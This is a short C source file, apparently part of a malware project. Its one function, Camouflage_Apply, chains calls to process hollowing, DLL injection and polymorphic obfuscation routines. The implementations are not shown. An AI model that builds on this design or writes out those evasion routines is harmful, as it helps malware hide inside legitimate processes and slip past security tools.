#include "camouflage.h"
#include "process_hollowing.h"
#include "dll_injection.h"
#include "polymorph.h"

void Camouflage_Apply() {
    ProcessHollowing_Run();
    DLLInjection_Inject();
    Polymorph_Obfuscate();
}
